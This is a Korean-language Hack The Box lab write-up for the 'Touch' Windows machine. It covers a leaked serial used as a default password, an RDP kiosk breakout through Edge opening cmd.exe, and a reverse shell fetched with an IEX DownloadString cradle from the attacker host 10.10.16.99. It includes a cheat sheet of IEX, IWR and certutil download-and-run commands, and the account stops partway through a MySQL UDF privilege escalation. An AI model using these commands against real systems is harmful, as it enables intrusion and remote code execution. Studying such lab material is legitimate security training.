---
title: "[HTB] Touch (Easy_Windows) _ Kiosk"
date: 2026-10-10 10:43:00 +09:00
categories: [Security & Hacking, HTB]
tags: [Hack The Box, hacking, RedLabs, Windows]
password: "20261010"
pin: true
---

![Touch](https://github.com/user-attachments/assets/66c2776e-73ca-4dc6-a5ff-0a56c2f91231#.png)

[Touch has been Pwned, OilLampCat has successfully pwned Touch Machine from Hack The Box](https://labs.hackthebox.com/achievement/machine/988787/987)

## 1. 시작에 앞서 _ 이게 왜 EASY?

![Touch](https://github.com/user-attachments/assets/43ee7820-6fe4-41d2-9e06-5df6eda36ac9#.png)

사실 이번 문제는 내가 EASY 문제니까 빠르게 풀고 OSCP+ 과정에 등록을 해야겠다! 하는 생각으로 내 능력을 테스트 해보기 위해 풀어보려 했던 문제였다.

다만... 아래 라이트업을 읽어보면 알게 되겠지만, 난 사실 이 문제를 풀면서 많이 꺾였다... 

그니까 뭐랄까, 내가 지금 OSCP를 등록한다고 해도 easy도 혼자의 힘으로 못 풀면서 자격증 시험에 도전할 수 있을까? 하는 것이기도 했고

내가 래빗홀에 갖혀서 그거에 한번 빠지면 헤어나올줄을 모르는구나 하는 깨달음도 좀 얻으며 일단 어제 등록을 시작하려던 OSCP+는 미뤄두었다.

아무래도 오늘 내일 OSCP+ 에 대한 준비와 나만의 치트 시트를 좀 만들고 등록을 시작해야겠다.

## # 공격 체인 요약

8443 DeviceHub → /api/status 시리얼 노출 → 기본 비번 로그인
→ 대시보드에서 KioskUser 자격증명 → RDP → 키오스크 탈출
→ 소스코드 DB 비번 → 스케줄 스크립트 root 비번 → MySQL UDF → SYSTEM

## 2. 초기 침투 : 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![이전문제](https://github.com/user-attachments/assets/82a4a97d-1091-4e0b-8bc9-61d5caab54df#.png)

이번에 푼 문제는 아레나 문제로 이전의 linux 문제에서 이어진다고 한다.

다행인건 그래도 필요한 크레덴셜을 주었다는 거려나.

`Jenny Crawford` / `KS7X2M`

### 2-1. 포트 스캐닝

![nmap](https://github.com/user-attachments/assets/45fce2d1-3e75-4164-8200-68e716a18af3#.png)

포트 스캐닝을 통해 이미 확인하긴 했지만 **Windows 머신**이라는 것과 `135`, `3389`, `5985`, `8443` 번 포트가 열려있음을 확인했다.

게다가 그 중엔 **RPC**, **HTTP** 서비스가 돌고있는걸 확인할 수 있었기에 일단 주어진 크레덴셜을 이용해 RPC에 접근을 해보려 했다. 하지만 그렇게 푸는 것이 아닌지 크레덴셜로 할 수 있는게 없었고, AD 머신이 아니였기에 윈도우 머신을 풀 때 하던 ldap과 같은 서비스를 통해 정찰은 불가능 했다.

그렇다면 열려있는 HTTP 서비스에 접속을 해볼 차례이다.

### 2-2. HTTP 서비스 탐색

**5985**번 포트는 nmap 스캔에서도 나왔듯 404가 뜨며 접근할 수 없었다.

![8443](https://github.com/user-attachments/assets/38735218-ffab-4e44-966a-1704542e973d#.png)

하지만 8443번 포트는 접속이 가능했기에 들어가보면 위처럼 **Nexion DocReader**라는 어떤 로그인 화면이 나온다.

우리가 확인할 수 있는 정보는 `DeviceHub DH-100`이라는 어떤 장치에 관한 내용이라는 것과, `Gate B7` 어떤 게이트에 있는 장비라는 것, `Device password`만 있어서 아이디를 넣는건 없다는 사실과, `Scan Staff Badge` 스테프 배지를 스캔해서 들어갈 수 있다는 것이었다.

> 난 여기서 가장 중요한 **Forgot your password?** 가 눌리지 않기에 그냥 더미로 만든거구나 싶어 넘겼었다... 이게 가장 중요한 것이었거늘...

당연히 여기서도 주어진 크레덴셜 정보를 이용해 모두 넣어봤지만 딱히 효력은 없었다.

![dirsearch](https://github.com/user-attachments/assets/9567c12c-17f9-4731-8a61-2b66c312679f#.png)

그럼 다른 숨겨진 것이 있지 않을까 싶어 dirsearch를 돌려보았지만 `/api`가 존재한다는 것을 제외하면 특별한 정보를 찾지 못했다.

### 2-3. 삽질의 끝, 답은 페이지 소스에 있었다

![나는](https://github.com/user-attachments/assets/7d9f63c0-c0cf-4a43-a8c3-c4d6f9d9b19f#.png)

나는 그래서 burp로 연결을 해두곤 정말로 적어도 내가 아는 한 모든 방법을 다 써보기 시작했다. 접근 가능한 포인트에 파라미터를 욱여넣어보기도 하고, 리스폰스를 뜯어서 마치 성공 한 것 처럼 꾸며보기도 하고.

그런데 그 모든 시도는 실패했다. 배지로 로그인을 하는 것도 스캔을 요청하는걸 보면 딱히 뭔가 내가 건들일 수도 없었고, 로그인 부분도 정말로 password만 넘어 갔었으니까.

> **사실 지금 생각해보면 난 이 때 이미 래빗홀에 빠져있었다.**

그리고 뭔가 나 자신에게도 좀 화가 났었던 것 같다. OSCP라는 자격증 시험에 도전하겠다고 호기롭게 말하며 그 전에 EASY 문제 하나 딱 풀고 신청 해야지! 하고 도전을 했었는데, 고작 첫 관문에서, 그것도 초기 침투의 시작점에서 부터 막혀버다니.

이 때 첫번째로 맨탈이 심하게 흔들렸었다.

![source](https://github.com/user-attachments/assets/6cdfbbc5-88ab-415f-a210-2c9791404c92#.png)

그런데 정말로 어이가 없게도...

easy 문제 난이도에 맞게 힌트는 소스 코드에 있었다.

위에서 말했듯 forget your password를 소스 코드로 뜯어보니

`login-hint` 

`The default password is the device serial number included in your DeviceHub packaging.`

이라고 써있었던 것이다...

기본 비밀번호가 만약에 정말 만약에 안 바뀌어 있고, 장치의 시리얼 넘버만 찾을 수 있다면? 로그인을 할 수 있다는 뜻이렸다.

![source1](https://github.com/user-attachments/assets/c49331bf-7576-40db-87b8-fbf7131f0220#.png)

그래서 일단은 바로 메인 페이지에 나와있던 `DH-100`을 넣어보았다.

만 이건 장치의 시리얼 넘버가 아니였다.

![ferox](https://github.com/user-attachments/assets/8a09b749-1bf8-4204-91bc-c89fdfee2e6d#.png)

그럼 혹시 dirsearch로 찾지 못한 뭔가가 있지 않을까? 하는 생각에 `feroxbuster -u <IP> -k -x` 명령어로 스캔을 돌려보았다.

하지만 이 떄도 딱히 볼만한 구석을 찾지 못하였다. 그나마 볼만한 것은 dirsearch의 결과에서도 나왔던 403을 주는 `/api`랄까?

그리고 이 이후에도 엄청난 삽질을 하다가

> 이 때 두번째 맨탈이 흔들렸다. 지금 생각해보면 고작 이런거에? 싶은... try harder다 try harder...

![api](https://github.com/user-attachments/assets/b6394ec3-d00c-4d63-b29f-67b74f75a616#.png)

api 뒤에 이것 저것 변경해가면서 요청을 때려보다가 `/api/status`에서 쿠키값 없이 상태 요청을 보내주는 것을 확인할 수 있었다.

게다가 거기엔 무려 **serial** 넘버 까지 있었기에 이것으로 드디어 사이트에 접속 할 수 있었다.

### 2-tip. burp 연결하기 (wsl에서 윈도우의 burp로)

나는 wsl에서 kali를 쓰고 있었다. 그렇다보니 가끔 firefox나 burp와 같은 툴을 쓰게 되면 GUI가 꼬이는 것인지 클릭이 안 되거나, 창이 눌리지도 않고 반응도 안하는, 때로는 아예 창이 먹통이 되는 그런 상황이 자주 오곤 했다.

특히나 그게 firefox보다 특히나 burpsuite에서 크게 일어나곤 했다.

![kali1](https://github.com/user-attachments/assets/4d7b4d94-37d9-42dd-9732-4e5e30ff62e1#.png)

그래서 그동안 써보지 않았던 터널링을 통해 wsl의 네트워크와 윈도우(메인)의 burp를 연결시켜주기로 하였다.

위처럼 `microsocks -p 1080` 의 명령어를 쓰거나, ssh의 명령어를 통해서라도 일단 포트를 열어주고

![burp1](https://github.com/user-attachments/assets/7598395f-b2f6-40e8-9a0d-0f19acb1faf2#.png)

이렇게 **burp settings -> Network -> Connections -> SOCKS proxy** 에서 화살표로 표시한 `Use SOCKS proxy`를 우리가 열었던 포트로 설정 해주고 터널을 열게 되면

![burp2](https://github.com/user-attachments/assets/d71d4f36-3280-43e1-860f-149658d8aa4a#.png)

이렇게 wsl의 openvpn 네트워크에서 윈도우의 burp로 터널링을 이어줄 수 있다.

~~터미널 창을 하나 더 띄워줘야 하긴 하지만.~~

### 2-4. 로그인을 했다고 끝이였을까? (세 번째 삽질)

![ndhub](https://github.com/user-attachments/assets/16845b98-12d8-4c2c-b335-c1251d68d0a8#.png)

그렇게 찾아낸 시리얼 넘버를 통해 들어온 이 사이트는 보아하니 **스캐너** 장비와 **프린터** 장비를 관리하는 사이트로 보였다.

보통 이런 사이트에선 특히 easy 난이도의 문제라면 settings를 들어갔을 떄 평문으로 저장된 비밀번호가 있거나 하곤 했으니 바로 찾아가 보았다.

![settings](https://github.com/user-attachments/assets/124662e4-c01c-4d08-ac48-c2d65f7e9529#.png)

근데... 없네?? 어쨰서????

그래서 결국 페이지를 하나씩 자세히 살펴보기로 했다.

![스캐너](https://github.com/user-attachments/assets/20b3130e-b202-4546-a03a-cebbc57138f2#.png)

스캐너를 살펴보니 유저네임과 비밀번호가 있고, 장치를 껐다 켜거나 이미지를 올려 테스트를 하는 부분이 존재했다.

그리고 이 문제를 풀며 처음 알게 된 것인데, 왼쪽 아래에 써있는 **MRZ(Machine Readable Zone, 기계판독영역)** 란 여권이나 신분증 사진 페이지 아래쪽에 `<<<`가 잔뜩 박힌 그 두세 줄 텍스트를 말한다.

이름·여권번호·국적·생년월일 같은 정보가 정해진 포맷으로 인코딩되어 있어서, 스캐너가 OCR로 이 부분을 읽어 신원을 자동으로 인식한다.

그러니까 이 스캐너 설정에 **"MRZ Detection"** 체크박스가 있다는 건, 이 장비가 업로드된 이미지에서 여권의 MRZ를 파싱(판독)하는 기능을 돌린다는 뜻이었다. 

당연히 나는 "그럼 여기에 뭔가 인젝션을 넣을 수 있지 않을까?" 하는 생각에 또 한참을 파고들게 된다...

지금에야 말하지만 이것도 **래빗홀** 중 하나였던 셈이다.

정말로 이미지를 직접 만들어 올려보기도 하고, 혹시 포멧을 다르게 해서 올리면 될까? 싶어 해봤는데 그것도 아니였다.

![프린터](https://github.com/user-attachments/assets/a0b67e7d-f23f-4009-9d5d-e65068a1f742#.png)

다음으론 프린터를 살펴보았다. 이번에도 똑같이 아이디와 비밀번호가 있었고, 여기선 우리가 키오스크 보면 종이를 뽑는 곳이 있지 않던가? 바로 그 종이를 테스트로 뽑아보거나 끄고 켤 수 있는 관제 부분이었다.

그리고 당연하게도 여기서도 삽질을 했지만 찾지 못했다. 되려 테스트로 종이를 하도 뽑아서 종이가 부족해 리셋을 돌려야 하기도 했다.

**래빗홀**이다. 제작자가 의도한건 아닐 수 있었지만 되려 내가 너무 파고들어서 생겨버린...

![로그](https://github.com/user-attachments/assets/d2d891df-2f8a-41d1-909f-1b92f0ba7508#.png)

다음으론 활동 로그 부분이었다.

정말 마지막으로 기대를 하며 들어갔지만 내가 로그인 한거나 테스트 하며 시도해본 내용들 뿐이었다. 혹시 기다리면 누군가 이 장비에 찍고 지나가면서 로그에 남지 않을까? 했지만 그건 의도된 사항이 아니였다.

## 3. 초기 침투 (Initial Foothold / Exploitation)

![winrm](https://github.com/user-attachments/assets/80371f82-018b-4583-9642-2ce093e3dbe3#.png)

사실 나도 당연히 새로운 크레덴셜 `KioskUser`와 `K!0sk2026#` 같은 계정을 얻자 마자 포트 스캐닝 과정에서 찾은 nmap 포트 내용 대로 rpc를 시도해 보긴 했었다. 근데 안되었어서...

![삽질](https://github.com/user-attachments/assets/1bab4d31-cdb9-4d2e-9e6a-9a3f307bb197#.png)

그래서 이렇게 미친 삽질을 했었다.

### 3-1. 정답은 다른 곳에 - 135도 5985도 아닌 3389(RDP)

근데 생각을 해보면 당연할지도 몰랐다.

우리가 찾았던 nmap 결과를 다시 살펴보면

![nmap](https://github.com/user-attachments/assets/45fce2d1-3e75-4164-8200-68e716a18af3#.png)

- 135(RPC) -> 원격 프로시저 호출 포트
- 5985(http) -> 이놈이 Winrm 포트였..??!!
- 3389(ms-wbt-server) -> RDP였네...

그렇다... 난 RPC를 보곤 아 winrm으로 저기 접근하면 되지?! 하고 완전히 잘못 생각하고 있었던 것이다.

> 135 포트에 대한 보충 설명 : RPC 엔드포인트 매퍼로 "어떤 RPC 서비스가 어느 동적 포트에 있는지 알려주는 안내데스크" 같은 거고, 그 자체로 셸을 주는 서비스가 아니다.

게다가 nmap에 나온 내용만 보곤, 너무 오랜만에 윈도우 머신을 풀어서인지, 정리를 따로 안 해서인지 까먹곤 써있는 그대로 이해를 잘못 하고 있었던 것이다.

심지어 5985번 포트에 들어갔다가 내가 404 뜬다고 했었는데 그것도 사실 이 포트가 브라우저용 웹페이지가 아니라 API 엔드포인트라서 404가 떴었던 것이었다. winrm-http라고 한다. HTTPS버전은 5986을 쓴다더라.

게다가 

**3389 (ms-wbt-server)** 의 경우 - `ms-wbt-server` = `MS Windows-Based Terminal server` = `RDP`

RDP의 표준 포트가 3389고, nmap은 서비스명을 이 옛날 이름으로 표기한다고 한다... 

이래서 치트 시트를 만들어야 하는거다...

### 3-2. 조금만 더 nmap 결과를 분석 해보자.

사실 정작 문제를 풀 때는 확인하지 못했지만 이제 와서라도 조금 정리를 해볼까 한다.

> 1. `Microsoft HTTPAPI httpd 2.0` (5985·8443 둘 다)

-> IIS가 아니라 **HTTP.sys 기반 자체 호스팅 앱**이란 뜻. 

즉 8443 DeviceHub는 **커스텀 .NET**앱. 

"커스텀 앱 = 커스텀 취약점을 기대"라는 방향을 잡아주는 단서.

> 2. `8443 http-cors: GET POST PUT OPTIONS`

-> PUT 메서드 허용. 원래는 "PUT으로 파일 업로드(웹셸) 되나?" 의심해볼 단서. 

(이 박스에선 결국 안 됐지만, 봐야 할 포인트였을지도?)

> 3. `http-trane-info: Problem with XML parsing of /evox/about`

-> 이건 `nmap`의 `trane-info 스크립트가 잘못 찍은 노이즈`. 

Trane(공조장치) 탐지 스크립트인데 오탐이라 무시해도 됨. 

(초보자가 여기 낚여서 /evox/about 파는 경우 많아서, "이건 노이즈"라고 적어두면 독자한테 친절해요)

라고 클로드 선생님께서 알려주시더군요. 이건 진짜 전혀 몰랐음.

> 필요시 `nmap -p- --min-rate 1000 10.129.2.100 `로 전체 포트 스캔도 하면 좋을 것 = 치트시트 각

### 3-3. xfreerdp (취득한 크레덴셜 사용)

![nxc](https://github.com/user-attachments/assets/254704c1-c9f7-4b41-95e8-e92d5af3da1c#.png)

그렇게 nxc를 이용해 다시 확인을 해보니 winrm은 거부가 떴다. 나중에 알고보니 애초에 이 계정(KioskUser)는 `Remote Management Users`에 없었다.

RDP도 똑같이 빨간 `[-]`를 뱉었다. 그래서 아 그럼 RDP도 안되네? 하고 넘어가려 했는데 실패 사유가 인증 실패가 아닌 `SSL_NOT_ALLOWED_BY_SERVER` 이라고 **TLS 협상 실패**였던 것이다!!

~~이것도 치트시트에 넣어야겠다. enumeration에 넣으면 좋을듯?~~

![xfreerdp](https://github.com/user-attachments/assets/2e266c68-66b9-483f-b5a8-9b6ed4a69e44#.png)

그렇게 `xfreerdp`를 이용해 직접 붙어보니?

![오](https://github.com/user-attachments/assets/400ce2be-3092-4a99-b649-e1d5a1e61e80#.png)

오? 되나?

![로그인 후 오래걸림](https://github.com/user-attachments/assets/45820f6a-bb5f-4e0f-adea-5b5eaaf7b902#.png)

로그인이 되긴 했는데 엄청 오래 기다렸다가

![드디어](https://github.com/user-attachments/assets/848db42f-80d1-4295-8d03-6c77fed32d80#.png)

드디어!! 접속하느데 성공했다!!

그러니까 이 화면이 바로 우리가 햄버거 가게를 가던 음식점 가게를 갈 때 마다 보던 그 키오스크의 화면을 내가 때온 것이다!!

정말로.. enumeration만 제대로 했으면 삽질을 할 일이 없었을탠데...

### 3-4. 에러가 곧 탈출구 - 키오스크 브레이크아웃

우리가 종종 키오스크를 쓰다보면 윈도우 오류가 터지면서 창 밖으로 나가져 사장님을 부르거나

내가 자주가던 초밥 집에선 오류가 생겨서 눌러도 탭이 안 넘어가면 점원분이 오셔서 페이지에서 나갔다 들어오곤 했는데 여기서도 바로 그 방법을 쓰게 될 것이다.

![예약 조회](https://github.com/user-attachments/assets/12a8f306-1c5b-4060-bd19-28af6a872536#.png)

일단은 언어 선택을 했다면 다음으론 이렇게 예약 조회를 하게 될 것이다. 그리고 무려 이 때 쓰는 계정이 문제 초반에 나왔던 바로 그 크레덴셜 정보였다...

참고로 저기 성 써야 하는데 내가 실수로 풀네임을 넣었다.

![scan](https://github.com/user-attachments/assets/32606829-e1bf-42f9-82c5-0438accf33a0#.png)

예약 검색에 성공하게 되면 이렇게 여권을 스캔할 수 있는 부분이 나온다. (여기가 공항 키오스크였던 것 ㄷㄷ)

![fail](https://github.com/user-attachments/assets/0ab8fc32-fb8a-4eb0-b743-78775f83d325#.png)

어찌보면 당연하겠다만 우리는 스캐너에 뭘 댈 수가 없으니 이렇게 실패를 하고 만다.

![그런데](https://github.com/user-attachments/assets/42967dfc-97ae-4158-91b3-1603aac76272#.png)

그런데 우리는 분명 이 스캐너를 조작할 수 있지 않던가? 그래서 직접 MRZ를 만들어 넣어보곤 스캔을 진행해보았다.

![어림도 없지](https://github.com/user-attachments/assets/57a4107d-b206-47ef-a97b-031bb758448e#.png)

하지만 어림도 없었다. 스캔을 해도 등록된 사람이 아니라며, 아니 그보다 데이터를 읽을 수 없다며 빠꾸를 먹였다.

여기서 난 뇌정지가 왔다.

갖고 있는 크레덴셜도 다 썼고, 이건 burp로 터널링도 할 수 없는데 뭘 어떻게 하라는 소리란 말인가?

![꺼버렷](https://github.com/user-attachments/assets/6ee508eb-c54b-4d7d-8d88-dfc86a5c8ddd#.png)

그러다 문뜩 다시 스캐너로 돌아가 전원을 내려버렸다. 

보통 장비가 꺼져있는데 부르려고 하면 오류가 뜨곤 하니까.

![솔직히](https://github.com/user-attachments/assets/e88b169a-6e7e-422b-a9f6-c51549fd1e0b#.png)

솔직히 난 여기서 오류가 그냥 한줄 띡 뜨거나 할줄 알았다. 그런데 아예 그냥 팝업이 떠버리네??

![게다가](https://github.com/user-attachments/assets/e16ed68a-6d1e-45de-a52f-abe753585de6#.png)

게다가 저 링크를 누르니 ms edge의 창이 뜨네??

와 진짜 머리가 터지는 줄 알았다. 처음 보는 초식이야...

![cmd](https://github.com/user-attachments/assets/314014c8-4ba9-4ab6-8afc-b2a44b1342c5#.png)

브라우저는 `http://`와 같은 주소 뿐 아니라 **로컬 파일 경로도**도 넣어서 열 수 있다.

그렇기에 url 대신 `C:\Windows\System32\cmd.exe`를 그대로 입력해 Edge가 cmd.exe를 다운로드 파일로 받아버리고 그 받아진 파일을 열면?

![짜잔](https://github.com/user-attachments/assets/2c0a8cdf-bb66-488b-9321-2e41debd0c26#.png)

이렇게 CMD를 얻어낼 수 있었다!

kiosk 해킹에 대해서 조금 찾아보고 했으면 훨씬 쉬웠을 탠데...

![user](https://github.com/user-attachments/assets/5a987fe8-8b20-4ea5-9263-777e9e728376#.png)

그렇게 user.txt를 찾아낼 수 있었다...

드디어 초기 침투에 성공한...

### 3-5. kali 쉘로 받기 1

하지만! 이렇게 권한 상승을 진행하기엔 RDP로 타자를 치면 2초 뒤에 입력이 되는 무친 딜레이를 갖고 있었으며

바탕을 잘못 클릭하게되면 다시 위 과정을 해야 했기에 리버스 쉘을 엮어주기로 하였다.

![rev](https://github.com/user-attachments/assets/4268155d-9cf5-40d0-8e8b-9d5005865254#.png)

그렇기에 일단 revshell에 들어가서 ps1으로 하나 만들어주고, 

![서버를 열어](https://github.com/user-attachments/assets/1bfbb927-3059-4ce1-8900-db63e64bd2c6#.png)

kali쪽에 서버를 열어 revshell을 보내고

![rev 받기](https://github.com/user-attachments/assets/b3ca2a94-042a-4ea5-bfa8-53d5e667a816#.png)

머신의 cmd 창에 `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.99/rev.ps1')"` 를 넣어 다운로드와 동시에 실행시켜 리버스 쉘을 받아냈다.

### 3-6. kali 쉘로 받기 2

그런데 말입니다.

솔직히 쉘이 좀 못났잖아요?

평소엔 python 으로 tty 쉘을 열거나 그럴텐데 여기는 python도 없고 윈도우니까요. 그래서 좀 다른 방법을 클로드에게 물어봐 새로운 방법을 써보았다.

![invok](https://github.com/user-attachments/assets/9eff9a8d-c003-48da-924d-c0645a32cfa4#.png)

**Invoke-ConPtyShell**은 윈도우용 full TTY를 만들어주는 powershell 스크립트로 평소 `python -c 'import pty; pty.spawn("/bin/bash")'` 로 하던 걸, 윈도우에서 대신 해주는 도구라고 보면 된다.

심지어 이걸 쓰면 명령어 넣을 때 ls라고 해도 dir로 넘어가더라?

![invok1](https://github.com/user-attachments/assets/cda38f08-ee94-49fa-88ae-e4a26b19472b#.png)

이렇게 명령어를 입력해 다시 kali에서 머신으로 스크립트를 넘겨주고 실행하면?

![invok2](https://github.com/user-attachments/assets/b48ced11-098e-45f4-a0e4-5d697de25253#.png)

이렇게 매우 편안~ 한 쉘을 얻을 수 있었다.

사실 내가 이걸 넘겨서 실행 시키곤 내가 연 파이썬 서버에다가 ls, whoami를 쳐두고 왜 안됨 하고 칭얼거렸었는데 아뿔싸...

다른 쉘에 있었다...

![쉘 많아](https://github.com/user-attachments/assets/66b082f6-3d53-49f6-9e39-162a4a07376c#.png)

최종적으론 이렇게 쉘이 많이 켜져야 했으니까

라기보단 그냥 내가 맨탈이 약했어서 그렇지뭐....

## 4. 권한 상승 (Privilege Escalation) 

자 그럼 이제 드디어 권한 상승을 들어갈 차례이다.

일단 이 부분에 대한 나의 소감은

1. 미쳐버린 딜레이에 멘탈이 흔들렸다. -> 한 글자를 누르면 무슨 3,4초 뒤에 반응했다.
![이런식](https://github.com/user-attachments/assets/557a1395-f6e5-48f0-9b67-f7f4e321bc2b#.png)
2. 이런 식으로 쉘이 자꾸 이상하게 꼬여 나와서 미치는 줄 알았다. -> 글자 크기 조절 하니까 그제야 괜찮더라...
3. 윈도우의 파일 구조를 내가 잘 몰랐다. -> 이건 내가 공부해야할 부분이다.

> 권한 상승 체인 요약

재정찰(winPEAS) -> MySQL이 SYSTEM으로 도는 것 발견 (+ 플러그인 폴더 쓰기 가능)
-> 소스코드에서 DB 계정(kiosk_app) 획득, 하지만 권한 부족
-> 스케줄 스크립트에서 MySQL root 비밀번호 평문 노출
-> MySQL UDF 하이재킹 (sys_eval)
-> nt authority\SYSTEM -> root.txt

### 4-1. 다시, 정찰 — SYSTEM으로 도는 MySQL (winPEAS)

![whoamipriv](https://github.com/user-attachments/assets/5e0a52a4-ab6b-4f4e-a60b-0d7e27d3c610#.png)

일단 권한 상승을 진행하기에 앞서 초기 침투를 하기 전 처럼 일단 내가 뭘 할 수 있는가를 확인하고자 했다.

- `whoami /priv` - 내 계정이 갖고 있는 권한을 살펴볼 수 있었다.

리눅스로 치면 `sudo -l` 같은 느낌?

![group](https://github.com/user-attachments/assets/6ccf5efa-510b-409d-a4d2-10915f3bcf3a#.png)

ad문제를 풀 때 자주 만났던 그룹에 대한 내용이다.

현재 확인해보니 `Administrators`는 없고, `Printer Administrators`와 `Remote Desktop Users` 뿐이었다.

여기서 이제 아까 왜 WinRM이 안되는 이유가 나온다. RM은 `Remote Management Users` 그룹이 있어야 했으니까.

이건 `id`나 `groups` 같은거.

![net](https://github.com/user-attachments/assets/a3fab922-f707-41ab-a509-51ddb76e0801#.png)

`net user` 명령어를 넣어 계정 목록을 살펴보니 실질적인 목표는 `Administrator`였다.

그리고 내가 이후 이곳 저곳 파일을 뒤져보기 시작했는데 솔직히 갈피를 전혀 못 잡고 시간만 보냈기에 **winPEAS**를 돌리기로 했다.

![winpeas1](https://github.com/user-attachments/assets/92a01ea8-baeb-469d-ade1-f93e53b2886e#.png)

winPEAS도 kali에서 머신으로 올려주고 

![winpeas2](https://github.com/user-attachments/assets/419564f4-e6f2-43c8-aee3-f396f52ed557#.png)

위처럼 실행시켜주고 기다리면? 결과가 나온다.

> winPEAS는 `.exe` 바이너리라 리버스셸(`.ps1`) 때처럼 `IEX`로 메모리 실행이 안 된다. 실행파일은 반드시 디스크에 저장한 뒤 돌려야 해서 `-OutFile`로 받았다.

> 스크립트(.ps1) — 메모리 실행, 디스크에 안 남음

`IEX(New-Object Net.WebClient).DownloadString('http://LHOST/x.ps1')`

`IEX(IWR http://LHOST/x.ps1 -UseBasicParsing)`

> 바이너리(.exe) — 저장 후 실행

`IWR http://LHOST/x.exe -OutFile C:\Windows\Temp\x.exe ; & C:\Windows\Temp\x.exe`

`certutil -urlcache -split -f http://LHOST/x.exe C:\Windows\Temp\x.exe`

![mysql1](https://github.com/user-attachments/assets/50346bd1-e9bf-4c68-9eff-12d9564040fe#.png)

1. 보아하니 **MySQL80 서비스**가 실행중이고
2. `C:\MySQL\bin` 폴더에 내가 쓰기, 파일 넣기가 가능했다.

![mysql2](https://github.com/user-attachments/assets/d2fce045-27bb-4046-95e7-07eebe6d73e8#.png)

3. 다시 한번 `bin` 폴더의 모든 실행 파일을 우리가 덮어쓸 수 있다고 한다.

![scpc](https://github.com/user-attachments/assets/a3bd363b-beef-4b98-bed9-b8a016795ddc#.png)

그리고 좀 더 자세히 확인해보기 위해 이 MySQL이 어떤 권한으로 도는가를 확인해보기로 했다.

`sc.exe qc MySQL80`

그렇게 그 결과가 말하길! 무려! **LocalSystem** 즉 **SYSTEM**의 권한으로 실행 중이었다.

### 4-2. DB에 접속하라 — 소스코드 속 자격증명

근데.. MySQL을 쓰려면 결국 로그인 자격 증명이 필요하지 않나?

사실 그래서 일단 지금 갖고 있는 크레덴셜을 모두 써보았다. 장치의 크레덴셜이나, 초기에 준 것.

하지만 모두 실패했고, 일단 뭐가 되었든 결국 로그인을 위한 자격 증명을 찾으러 떠나야 했다...

그래도 완전히 길도 없다가 MySQL의 비번 찾기로 바뀌었으니 그나마 다행이려나?

![좀더](https://github.com/user-attachments/assets/f6f413cb-f1b0-4805-bcd0-8c75d7dd7c8e#.png)

WinPEAS를 좀 더 살펴보니 박스엔 커스텀 앱 두개가 깔려있었다.

`C:\Program Files\HTB Airways` (키오스크 앱)과 `C:\Program Files\Nexion Systems` (8443번의 DeviceHub)

DB에 붙는 앱이니까 그럼 어딘가에 접속 정보가 있을거라고 생각하고 뒤져보기 시작했다.

![kioskapp](https://github.com/user-attachments/assets/a0999c9d-7d3e-4333-9a75-e63646829b62#.png)

하지만 일단 kiosk app엔 WebView2 기반의 프론트엔드 실행파일만 있고 설정은 없었다.

![대신](https://github.com/user-attachments/assets/53f79b2a-fae4-45ca-b317-d1e3376747be#.png)

진짜는 백엔드 소스에 있었다.

딱 봐도 이름이 database이길래 혹시 하는 마음에 모두 다 읽어봤는데 정말로 DB 자격증명이 소스에 그대로 하드코딩 되어있었다!!

허... 나중엔 password를 기준으로 전체 스캔하는 명령어를 좀 찾아봐야겠다.

> `findstr /s /i "password" *.ini *.config`

![sql](https://github.com/user-attachments/assets/436c4b8a-00d9-44da-8a62-0fbf19adbf3e#.png)

사실 이제 여기서 난 바로 `mysql.exe`로 접속해 `mysql>` 프롬프트가 뜰 줄 알았는데 바로 튕겨나와서 어쩔 수 없이 `-e "SQL"` 이런 식으로 한줄 씩 써서 날려야 했다.

> 참고로 mysql 명령어 쓸 때 비밀번호를 `-p` 띄어쓰고 비밀번호를 넣는게 아니라 저렇게 붙여 써야지만 바로 비밀번호가 들어가는 형식 이더라..? 

그래서 저렇게 빨간색이 뜨는 이유가 "님! 명령어에 비번을 넣어서 썼음!!" 이라고 소리치는 것.

![아진짜](https://github.com/user-attachments/assets/05fc5620-7516-4ccb-8248-a67295bb3ba0#.png)

아 진짜 이런 문제가 뜰 때 너무 화가 나더라. 이게 내가 멘탈이 흔들렸던 이유 중 하나랄까...

![grant](https://github.com/user-attachments/assets/fb076169-7376-41e5-b301-eed000b341e7#.png)

그럼 이제 내 권한이 어떤게 있을지 확인을 해봐야 했다.

![securepriv](https://github.com/user-attachments/assets/6b7d0d43-ee8a-4a90-8385-d567e9b012b3#.png)

내친김에 DB 내부랑 서버 설정도 좀 봤다.

테이블은 `bookings`, `passengers` 같은 항공 예약 앱 데이터뿐이라 크레덴셜 쪽으론 건질 게 없었고,

대신 `secure_file_priv` 값이 **NULL**로 나왔다. 지금은 "아 파일 관련 설정이 꺼져있구나" 정도로만 넘어갔는데 — 이게 나중에 4-4에서 발목을 잡았다. (원래는 뭔지 모르는데 클로드 선생님께서 보라고 하셔서...)

다만 난 이걸 봐도 그럼 이 권한으로 내부 DB를 살펴보면 되는건가? 이 3초에 입력을 하나 받는 이 쉘로? 라고 생각했는데,

클로드 선생님께서 말씀하시길.

MySQL은 `SELECT`, `SHOW`같은 SQL만 실행하지, `whoami` 같은 OS 명령은 돌릴 수가 없는데 이 둘을 이어주는게 바로 **UDF(User Defined Function)** 이라는 것이 있다고 했다!

역시 클로드 선생님. 내가 또 모르는 무언가가 나왔다.

> UDF는 MySQL에 **"OS 명령을 실행하는 함수"를 추가**하는 플러그인(.dll)이다. 이걸 심어두면 `SELECT sys_eval('whoami')` 처럼 SQL 명령어로 OS 명령을 실행 할 수 있고, MySQL이 지금 SYSTEM이니 그 명령어도 SYSTEM으로 실행이 된다는 것이다!!

그런데 지금 문제가... kiosk_app은 `htb_airways` DB 한정으로는 전권이지만, 전역 `FILE` 권한이 없다. UDF를 쓰려면 FILE 권한이 필요한데 이 계정엔 없다.

고로 진짜 MySQL root 계정의 비밀번호를 따로 찾아야 했다.

### 4-3. kiosk_app으론 부족하다 — root 비밀번호 사냥

![대신](https://github.com/user-attachments/assets/53f79b2a-fae4-45ca-b317-d1e3376747be#.png)

그렇다면 어디를 살펴보아야 할까... 고민을 하다 우리가 위에서 새로운 크레덴셜을 찾을 때 보았던 `index.ts`속 분명히 `DB_CONFIG_PATH`가 존재 했었다.

그렇다. 윈도우의 경우 `Program Files`는 설치된 **프로그램 본체**가 있는 곳이고, `ProgramData`는 그 앱들이 공유하는 **설정/데이터**가 저장되는 곳이기에 혹시나 여기에 따로 DB 정보가 있을까? 하는 생각에 찾아가보기로 했다.

